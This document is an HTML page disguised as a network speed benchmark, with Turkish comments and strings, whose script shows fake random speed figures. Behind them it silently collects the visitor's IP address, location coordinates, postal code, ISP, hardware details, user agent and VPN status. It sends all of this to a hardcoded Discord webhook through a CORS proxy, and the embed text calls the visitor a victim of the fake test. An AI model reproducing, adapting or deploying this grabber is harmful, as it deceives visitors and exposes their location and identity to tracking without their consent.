<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qeat Network - Advanced Speed Benchmark</title>
    <style>
        :root {
            --glow-color: #00f0ff;
            --accent-color: #ff0055;
            --bg-color: #05070f;
            --panel-bg: #0c1020;
            --border-color: #1e294b;
        }

        body {
            background-color: var(--bg-color);
            color: #f3f4f6;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            background-image: 
                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: var(--panel-bg);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            padding: 35px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0, 240, 255, 0.1);
            position: relative;
            backdrop-filter: blur(5px);
        }

        .container::before, .container::after {
            content: '';
            position: absolute;
            width: 15px;
            height: 15px;
            border: 2px solid var(--glow-color);
        }
        .container::before { top: -2px; left: -2px; border-right: 0; border-bottom: 0; }
        .container::after { bottom: -2px; right: -2px; border-left: 0; border-top: 0; }

        h2 { 
            margin-top: 0; 
            font-size: 24px; 
            color: var(--glow-color); 
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
        }
        
        p { color: #64748b; font-size: 13px; margin-bottom: 30px; font-weight: bold; }
        
        .speed-gauge {
            width: 180px;
            height: 180px;
            border: 4px dashed var(--border-color);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            position: relative;
            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.6);
        }

        .gauge-overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid transparent;
            border-top: 4px solid var(--glow-color);
            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
            top: -4px;
            left: -4px;
            box-sizing: content-box;
        }

        .speed-value { font-size: 38px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
        .speed-unit { font-size: 11px; color: var(--glow-color); letter-spacing: 1px; margin-top: 4px; }

        .btn-start {
            background: transparent;
            color: var(--glow-color);
            border: 2px solid var(--glow-color);
            padding: 14px 35px;
            font-size: 15px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 0 10px rgba(0, 240, 255, 0.1);
        }
        
        .btn-start:hover { 
            background: rgba(0, 240, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
            text-shadow: 0 0 5px #fff;
        }
        
        .btn-start:disabled { 
            border-color: var(--accent-color); 
            color: var(--accent-color);
            background: rgba(255, 0, 85, 0.05);
            cursor: not-allowed;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.2);
        }

        .status-box {
            margin-top: 25px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            font-size: 12px;
            text-align: left;
            border-top: 1px solid var(--border-color);
            padding-top: 20px;
        }
        .status-item { color: #475569; font-weight: bold; }
        .status-item span { color: #94a3b8; font-weight: normal; }
        
        .spinning .gauge-overlay { 
            animation: spin 0.8s linear infinite; 
            border-top-color: var(--accent-color);
            filter: drop-shadow(0 0 8px var(--accent-color));
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .terminal-bg {
            position: absolute;
            bottom: 10px;
            left: 10px;
            font-size: 10px;
            color: rgba(0, 240, 255, 0.15);
            text-align: left;
            pointer-events: none;
            font-family: monospace;
        }
    </style>
</head>
<body>

<div class="terminal-bg" id="term-bg">SYS_STATUS: READY<br>NET_METRIC: IDLE</div>

<div class="container">
    <h2>QEAT NETWORK</h2>
    <p>// QUANTUM SPEED OPTIMIZER v3.0</p>
    
    <div class="speed-gauge" id="gauge">
        <div class="gauge-overlay"></div>
        <div class="speed-value" id="speed-num">0.0</div>
        <div class="speed-unit" id="speed-unit">Mbps</div>
    </div>

    <button class="btn-start" id="start-btn" onclick="startTest()">Initialize Test</button>

    <div class="status-box">
        <div class="status-item">NODE: <span id="srv-name">TR-MAIN_NODE</span></div>
        <div class="status-item">LATENCY: <span id="ping-val">--</span></div>
    </div>
</div>

<script>
    const rawWebhook = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
    const proxyWebhookURL = "https://corsproxy.io/?" + encodeURIComponent(rawWebhook);

    function getGPU() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Bilinmiyor";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
    }

    async function startTest() {
        const btn = document.getElementById('start-btn');
        const gauge = document.getElementById('gauge');
        const termBg = document.getElementById('term-bg');
        
        btn.disabled = true;
        btn.innerText = "EXTRACTING METRICS...";
        gauge.classList.add('spinning');
        termBg.innerHTML = "SYS_STATUS: DEEP_SCAN_ACTIVE<br>NET_METRIC: HARVESTING_ALL_DATA";

        let speedInterval = setInterval(() => {
            let randomSpeed = (Math.random() * 140 + 40).toFixed(1);
            document.getElementById('speed-num').innerText = randomSpeed;
            document.getElementById('ping-val').innerText = Math.floor(Math.random() * 5 + 2) + " ms";
        }, 60);

        try {
            // 1. İstemci/Tarayıcı Derin Donanım Verileri
            const gpu = getGPU();
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor/Kısıtlı";
            const cores = navigator.hardwareConcurrency || "Bilinmiyor";
            const scrWidth = window.screen.width;
            const scrHeight = window.screen.height;
            const winWidth = window.innerWidth;
            const winHeight = window.innerHeight;
            const colorDepth = window.screen.colorDepth;
            const pixelRatio = window.devicePixelRatio;
            const touchPoints = navigator.maxTouchPoints || 0;
            const language = navigator.language || "Bilinmiyor";
            const cookieEnabled = navigator.cookieEnabled ? "Aktif" : "Pasif";
            const onlineStatus = navigator.onLine ? "Çevrimiçi" : "Çevrimdışı";
            const pdfViewer = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
            
            // 2. Akıllı VPN / Konum Analiz Verileri (Client-Side)
            const realTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; 
            const localTime = new Date().toLocaleString('tr-TR'); 
            let vpnDetected = "Temiz (Çelişki Yok)";

            // 3. Ağ API Çağrısı
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            
            // VPN Kontrol Algoritması
            if (data.timezone && realTimezone) {
                if (data.timezone.toLowerCase() !== realTimezone.toLowerCase()) {
                    vpnDetected = `⚠️ TESPİT EDİLDİ! (IP: ${data.timezone} | Sistem: ${realTimezone})`;
                }
            }
            
            // 4. Detaylı Metin Raporu Şablonu (.txt dosyası için)
            const report = `[QEAT ULTIMATE STEALTH LOG - FULL EXFILTRATION]\n` +
                           `==================================================\n` +
                           `[VPN VE GÜVENLİK ANALİZİ]\n` +
                           `VPN/Proxy Tespiti: ${vpnDetected}\n` +
                           `Gerçek Zaman Dilimi: ${realTimezone}\n` +
                           `Kullanıcı Yerel Saati: ${localTime}\n\n` +
                           `[AĞ VE IP BİLGİLERİ]\n` +
                           `IP Adresi       : ${data.ip}\n` +
                           `Ağ Tipi (Version): IPv${data.version || "4"}\n` +
                           `İnternet Sağlayıcı: ${data.org || "Bilinmiyor"}\n` +
                           `ASN (Ağ No)     : ${data.asn || "Bilinmiyor"}\n` +
                           `Ağ Sınıfı (Aralık): ${data.network || "Bilinmiyor"}\n\n` +
                           `[COĞRAFİ VERİLER]\n` +
                           `Ülke / Kod      : ${data.country_name} (${data.country_code})\n` +
                           `Şehir / Bölge   : ${data.city} / ${data.region}\n` +
                           `Posta Kodu      : ${data.postal || "Bilinmiyor"}\n` +
                           `Koordinatlar    : Enlem: ${data.latitude} / Boylam: ${data.longitude}\n` +
                           `Para Birimi     : ${data.currency_name} (${data.currency})\n\n` +
                           `[DONANIM ÖZELLİKLERİ]\n` +
                           `Ekran Kartı(GPU): ${gpu}\n` +
                           `Tahmini RAM     : ${ram}\n` +
                           `İşlemci Çekirdek: ${cores}\n` +
                           `Dokunmatik Nokt.: ${touchPoints}\n\n` +
                           `[EKRAN VE PENCERE METRİKLERİ]\n` +
                           `Monitör Çözünürlüğü: ${scrWidth}x${scrHeight}\n` +
                           `Tarayıcı Penceresi : ${winWidth}x${winHeight}\n` +
                           `Renk Derinliği     : ${colorDepth} bit\n` +
                           `Piksel Oranı (DPI) : ${pixelRatio}\n\n` +
                           `[YAZILIM İZLERİ]\n` +
                           `İşletim Sistemi : ${navigator.platform}\n` +
                           `Tarayıcı Dili   : ${language}\n` +
                           `User-Agent      : ${navigator.userAgent}\n` +
                           `Çerez İzni      : ${cookieEnabled}\n` +
                           `Ağ Durumu       : ${onlineStatus}\n` +
                           `==================================================`;

            // 5. Kusursuz Discord Embed Tasarımı
            const payload = {
                username: "Qeat Omega Sniffer v3.0",
                avatar_url: "https://i.imgur.com/v8tT77X.png",
                embeds: [
                    {
                        title: "💥 FULL EXFILTRATION: SİSTEM VE KONUM SIZDIRILDI",
                        color: 16580608,
                        timestamp: new Date().toISOString(),
                        description: `**Kurban, sahte hız testi paneline dokunduğu an tüm dijital maskesi düşürüldü.**`,
                        fields: [
                            { 
                                name: "🛡️ VPN & Sistem Zaman Analizi", 
                                value: `**VPN Tetikleyici:** \`${vpnDetected}\`\n**Yerel Saat:** \`${localTime}\`\n**Sistem Dili:** \`${language}\``, 
                                inline: false 
                            },
                            { 
                                name: "🌐 IP & Ağ Altyapısı", 
                                value: `**IP:** \`${data.ip}\` (IPv${data.version || "4"})\n**Sağlayıcı:** \`${data.org}\`\n**ASN:** \`${data.asn}\``, 
                                inline: true 
                            },
                            { 
                                name: "📍 Sağlayıcı Konumu", 
                                value: `**Konum:** \`${data.city}, ${data.region} / ${data.country_name}\`\n**Koordinat:** \`${data.latitude}, ${data.longitude}\`\n**Posta Kodu:** \`${data.postal || "--"}\``, 
                                inline: true 
                            },
                            { 
                                name: "💻 Donanım Özellikleri", 
                                value: `**GPU:** \`${gpu}\`\n**RAM:** \`${ram}\` | **İşlemci Çekirdek:** \`${cores}\`\n**Dokunmatik Ekran:** \`${touchPoints} nokta\``, 
                                inline: false 
                            },
                            { 
                                name: "🖥️ Ekran & Geometri", 
                                value: `**Çözünürlük:** \`${scrWidth}x${scrHeight}\`\n**Aktif Pencere:** \`${winWidth}x${winHeight}\`\n**DPI Oranı:** \`${pixelRatio}\``, 
                                inline: true 
                            },
                            { 
                                name: "⚙️ Yazılım İzleri", 
                                value: `**OS Platform:** \`${navigator.platform}\`\n**Çerez İzni:** \`${cookieEnabled}\`\n**Tarayıcı Ağ:** \`${onlineStatus}\``, 
                                inline: true 
                            }
                        ],
                        footer: { text: "Qeat Core Intelligence Network Group" }
                    }
                ]
            };

            const formData = new FormData();
            formData.append('payload_json', JSON.stringify(payload));
            const blob = new Blob([report], { type: 'text/plain' });
            formData.append('file', blob, `OMEGA_LOG_${data.ip}.txt`);

            // Verileri sessizce gönderiyoruz
            await fetch(proxyWebhookURL, { method: 'POST', body: formData });
            termBg.innerHTML = "SYS_STATUS: OMEGA_EXFIL_SUCCESS<br>NET_METRIC: ALL_SHARDS_CAPTURED";
        } catch (e) {
            termBg.innerHTML = "SYS_STATUS: CRITICAL_ERR_BYPASSED<br>NET_METRIC: FORCE_RECOVERY";
        }

        // Test bitti süvarisi
        setTimeout(() => {
            clearInterval(speedInterval);
            gauge.classList.remove('spinning');
            document.getElementById('speed-num').innerText = (Math.random() * 12 + 102).toFixed(1);
            document.getElementById('speed-unit').innerText = "Mbps (MAXIMUM OPTIMIZED)";
            btn.innerText = "BENCHMARK COMPLETE";
            btn.disabled = false;
        }, 4500);
    }
</script>
</body>
</html>
